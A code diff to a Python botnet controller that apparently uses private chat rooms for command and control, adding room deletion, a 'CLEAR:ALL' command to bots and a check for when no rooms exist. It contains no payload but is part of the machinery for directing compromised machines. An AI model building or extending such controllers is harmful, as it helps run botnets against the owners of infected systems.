@@ -66,8 +66,10 @@ class CommandRoom:
         # SCUFFED BECAUSE GIL
         self.bots = {k: bot for k, bot in self.bots.items() if bot[1] == True}
 
+    def leave(self) -> bool:
+        return self.room.leave()
 
-    def send_cmd(self, cmd):
+    def send_cmd(self, cmd) -> bool:
         return self.room.send_text(cmd)
         
 
@@ -126,16 +128,26 @@ class BotnetController:
             
     def assign_bot(self, botdata, roomid):
         self.command_rooms[roomid].add_bot(botdata)
+        
+    def clear_room(self, room):
+        self.send_command("CLEAR:ALL", room)
+        
+    def delete_room(self, room: CommandRoom):
+        self.clear_room(room)
+        time.sleep(1)
+        room.leave()
+        del self.command_rooms[room.room.room_id]
 
     def on_message(self, room, event):
         msgbody: str = event["content"]["body"]
         action, info = msgbody.split(":", 1)
         
         if action == "CONNECT" and not self.pinging:
+            if len(self.command_rooms) == 0:
+                return
             msgbody = msgbody.removeprefix("CONNECT:")
             msgbody = json.loads(msgbody)
             botid = msgbody["bot_id"]
-            # TODO: no room available? -> send RETRY IN: 
             # Uniform distr so should be fine
             room_id = random.choice(list(self.command_rooms.keys()))
             self.announce_room.send_text(
@@ -150,8 +162,6 @@ class BotnetController:
         elif action == "PONG" and self.pinging:
             room_id, bot_id = info.rsplit(":", 1)
             self.command_rooms[room_id].set_active(bot_id)
-            
-
             
     def create_room(self, name: str) -> Room:
         room: Room = self.client.create_room(name, is_public=False, invitees=[BOTS_NAME])
